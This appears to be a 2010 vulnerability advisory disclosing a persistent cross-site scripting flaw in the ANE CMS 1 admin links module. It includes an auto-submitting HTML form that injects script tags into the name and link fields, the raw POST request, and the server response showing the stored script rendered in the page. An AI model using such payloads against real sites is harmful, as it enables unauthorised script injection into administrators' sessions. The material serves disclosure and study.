@@ -1,0 +1,265 @@
+                                     =======================================================================
+    
+                                                  ANE CMS 1 Persistent XSS Vulnerability
+  
+                                     =======================================================================
+    
+                                                                   by
+    
+                                                              Pratul Agrawal
+  
+    
+    
+  # Vulnerability found in- Admin module
+    
+  # email         Pratulag@yahoo.com
+    
+  # company       aksitservices
+    
+  # Credit by     Pratul Agrawal
+  
+  # Software      ANE CMS 1
+ 
+  # Category      CMS / Portals
+ 
+  # Plateform     php
+   
+    
+    
+  #   Proof of concept   #
+  
+  Targeted URL:  http://server/acp/index.php?p=cfg&m=links
+   
+  
+  In ADD LINKS Field provide the malicious script to store in the Database.
+
+  That is-
+
+                      <html>
+
+                          <body>
+
+                             <form name="XYZ" action="http://server/acp/index.php?p=cfg&m=links&id=0" method="post">
+
+                                    <input type=hidden name="name" value=""><script>alert("XSS")</script>">
+
+                                    <input type=hidden name="link" value=""><script>alert("XSS")</script>">
+
+                                    <input type=hidden name="type" value="1">
+              
+                                    <input type=hidden name="view" value="0">
+
+                             </form>
+
+                               <script>
+
+                                 document.XYZ.submit();
+
+                               </script>
+
+                          </body>
+
+                        </html>
+
+
+  =======================================================================
+  Request -
+  =======================================================================
+  POST /acp/index.php?p=cfg&m=links&id=0 HTTP/1.1
+  Host: server
+  User-Agent: Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:1.9.1.8) Gecko/20100202 Firefox/3.5.8
+  Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+  Accept-Language: en-us,en;q=0.5
+  Accept-Encoding: gzip,deflate
+  Accept-Charset: ISO-8859-1,utf-8;q=0.7,*;q=0.7
+  Keep-Alive: 300
+  Proxy-Connection: keep-alive
+  Referer: http://server/acp/index.php?p=cfg&m=links
+  Cookie: PHPSESSID=200fecb6b36334b983ebe251d11a5df9
+  Content-Type: application/x-www-form-urlencoded
+  Content-Length: 41
+
+  name="><script>alert("XSS")</script>&link="><script>alert("XSS")</script>&type=1&view=0
+ 
+  ======================================================================= 
+  =======================================================================
+  Response-
+  =======================================================================
+  HTTP/1.1 200 OK
+  Date: Thu, 11 Mar 2010 06:59:03 GMT
+  Server: Apache/2.2.9 (Debian) mod_ssl/2.2.9 OpenSSL/0.9.8g
+  Expires: Thu, 19 Nov 1981 08:52:00 GMT
+  Cache-Control: no-store, no-cache, must-revalidate, post-check=0, pre-check=0
+  Pragma: no-cache
+  Vary: Accept-Encoding
+  Content-Type: text/html; charset: utf-8
+  Content-Length: 7771
+
+&#65279;&#65279;<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
+<html xmlns="http://www.w3.org/1999/xhtml">
+<head>
+<meta http-equiv="Content-Type" content="text/html; charset=utf-8" />
+<title>Transdmin Light</title>
+
+<!-- CSS -->
+<link href="./skins/aaa/css/transdmin.css" rel="stylesheet" type="text/css" media="screen" />
+<!--[if IE 6]><link rel="stylesheet" type="text/css" media="screen" href="./skins/aaa/css/ie6.css" /><![endif]-->
+<!--[if IE 7]><link rel="stylesheet" type="text/css" media="screen" href="./skins/aaa/css/ie7.css" /><![endif]-->
+
+<!-- JavaScripts-->
+<link rel="stylesheet" type="text/css" href="http://server/system/js/jquery.jgrowl.css" media="screen"/> <script type="text/javascript" src="http://server/system/js/jquery-1.3.2.min.js"></script><script type="text/javascript" src="http://server/system/js/jquery.jgrowl_minimized.js"></script>
+<style>div.jGrowl div.green {
+background-color: 		#00D400;
+color: 					navy;
+	}</style> 
+</head>
+
+<body>
+	
+	<div id="wrapper">
+    	<!-- h1 tag stays for the logo, you can use the a tag for linking the index page -->
+    	<h1><a href="#"><span>Administration</span></a></h1>
+
+        <!-- You can name the links with lowercase, they will be transformed to uppercase by CSS, we prefered to name them with uppercase to have the same effect with disabled stylesheet -->
+        <ul id="mainNav">
+        	<li><a href="index.php">Dashboard</a></li>
+        	<li><a href="?p=cfg">Configuration</a></li>
+        	<li><a href="?p=tpl">Design</a></li>
+        	<li><a href="?p=mod">Modules</a></li>
+        	<li class="logout"><a href="#">Logout Admin</a></li>
+		<li class="logout"><a href="../index.php">CMS</a></li>
+        </ul>
+        <!-- // #end mainNav -->
+
+        <div id="containerHolder">
+			<div id="container">
+	<div id="sidebar">
+		
+	<ul class="sideNav">
+	                        	<li><a href="?p=cfg">Show Setting</a></li>
+	                        	<li><a href="?p=cfg&m=mod">Modify Setting</a></li>
+	                        	<li><a href="?p=cfg&m=links">Links Management</a></li>
+	                        	<li><a href="?p=cfg&m=reposerver">Repository Server</a></li>
+	                        </ul>
+		
+	</div>
+	
+                <h2><a href="#">Configuration</a> » <a href="#" class="active">Links</a></h2>
+
+                <div id="main"><br>
+
+                <form action="?p=cfg&m=links&id=0" class="jNice" method="POST">
+
+<h3>Aggiungi un nuovo Link</h3>
+                <fieldset><p><label>Nome link:</label><input type="text" class="text-long" name="name" value=""/></p>
+                <p><label>Nome link:</label><input type="text" class="text-long" name="link" value=""/></p>
+<p><label>Tipo Link:</label><input type="radio" name="type" value="1" checked>Barra Links <input type="radio" name="type" value="2">Menu Links</p>
+
+<p><label>Accesso:</label>
+                <select name="view">
+                        <option value="0">Visible only to guests</option>
+                        <option value="1">Visible to all</option>
+                        <option value="2">Visible only to members</option>
+                        <option value="3">Visible only to admins</option>
+                </select>
+                </p>
+                
+                <input type="submit" value="Send" />
+</fieldset>
+                        </form>
+
+<table cellpadding="0" cellspacing="0">
+			    <tr>
+                                <td>Name</td>
+				<td>Link</td>
+				
+                                 <td>Options</td>
+                            </tr>
+                            <tr><td colspan="4">Bar Links</td></tr>
+			    			    <tr class="odd">
+                                <td>Home</td>
+				<td>index.php</td>
+				
+                <td><a href="?p=cfg&m=links&a=modify&id=1">Modify</a> <a href="?p=cfg&m=links&a=delete&id=1">Delete</a> <a href="?p=cfg&m=links&a=move&type=down&id=1">Move Down</a></td>
+                            </tr>
+						    <tr class="odd">
+                                <td>Blog</td>
+				<td>blog</td>
+				
+                <td><a href="?p=cfg&m=links&a=modify&id=2">Modify</a> <a href="?p=cfg&m=links&a=delete&id=2">Delete</a> <a href="?p=cfg&m=links&a=move&type=up&id=2">Move up</a> <a href="?p=cfg&m=links&a=move&type=down&id=2">Move Down</a></td>
+                            </tr>
+						    <tr class="odd">
+                                <td>Registrati</td>
+				<td>register</td>
+				
+                <td><a href="?p=cfg&m=links&a=modify&id=4">Modify</a> <a href="?p=cfg&m=links&a=delete&id=4">Delete</a> <a href="?p=cfg&m=links&a=move&type=up&id=4">Move up</a> <a href="?p=cfg&m=links&a=move&type=down&id=4">Move Down</a></td>
+                            </tr>
+						    <tr class="odd">
+                                <td>ACP</td>
+				<td>acp</td>
+				
+                <td><a href="?p=cfg&m=links&a=modify&id=5">Modify</a> <a href="?p=cfg&m=links&a=delete&id=5">Delete</a> <a href="?p=cfg&m=links&a=move&type=up&id=5">Move up</a> <a href="?p=cfg&m=links&a=move&type=down&id=5">Move Down</a></td>
+                            </tr>
+						    <tr class="odd">
+                                <td>Widgets</td>
+				<td>index.php?modifywidgets</td>
+				
+                <td><a href="?p=cfg&m=links&a=modify&id=6">Modify</a> <a href="?p=cfg&m=links&a=delete&id=6">Delete</a> <a href="?p=cfg&m=links&a=move&type=up&id=6">Move up</a> <a href="?p=cfg&m=links&a=move&type=down&id=6">Move Down</a></td>
+                            </tr>
+						    <tr class="odd">
+                                <td>master</td>
+				<td>master.asp</td>
+				
+                <td><a href="?p=cfg&m=links&a=modify&id=38">Modify</a> <a href="?p=cfg&m=links&a=delete&id=38">Delete</a> <a href="?p=cfg&m=links&a=move&type=up&id=38">Move up</a> <a href="?p=cfg&m=links&a=move&type=down&id=38">Move Down</a></td>
+                            </tr>
+						    <tr class="odd">
+                                <td>"><script>alert("XSS")</script></td>
+				<td>"><script>alert("XSS")</script></td>
+				
+                <td><a href="?p=cfg&m=links&a=modify&id=39">Modify</a> <a href="?p=cfg&m=links&a=delete&id=39">Delete</a> <a href="?p=cfg&m=links&a=move&type=up&id=39">Move up</a> <a href="?p=cfg&m=links&a=move&type=down&id=39">Move Down</a></td>
+                            </tr>
+			<tr><td colspan="4">Menu Links</td></tr>
+			    			    <tr class="odd">
+                                <td>home</td>
+				<td>index.php</td>
+				
+                <td><a href="?p=cfg&m=links&a=modify&id=14">Modify</a> <a href="?p=cfg&m=links&a=delete&id=14">Delete</a> <a href="?p=cfg&m=links&a=move&type=up&id=14">Move up</a> <a href="?p=cfg&m=links&a=move&type=down&id=14">Move Down</a></td>
+                            </tr>
+						    <tr class="odd">
+                                <td>Blog</td>
+				<td>blog</td>
+				
+                <td><a href="?p=cfg&m=links&a=modify&id=19">Modify</a> <a href="?p=cfg&m=links&a=delete&id=19">Delete</a> <a href="?p=cfg&m=links&a=move&type=up&id=19">Move up</a> <a href="?p=cfg&m=links&a=move&type=down&id=19">Move Down</a></td>
+                            </tr>
+			                        </table>
+<br />
+</div>
+
+                
+                <!-- // #main -->
+
+                <div class="clear"></div>
+            </div>
+            <!-- // #container -->
+        </div>
+        <!-- // #containerHolder -->
+
+        <p id="footer">Feel free to use and customize it. <a href="http://server">Credit is appreciated.</a></p>
+    </div>
+    <!-- // #wrapper -->
+    
+                    <script type="text/javascript">
+                     $(function()
+			{
+		    });</script> 
+</body>
+</html>
+
+ 
+=======================================================================
+ 
+ 
+   After completion Just Refres the page and the script get executed again and again.
+  
+  
+   #If you have any questions, comments, or concerns, feel free to contact me.
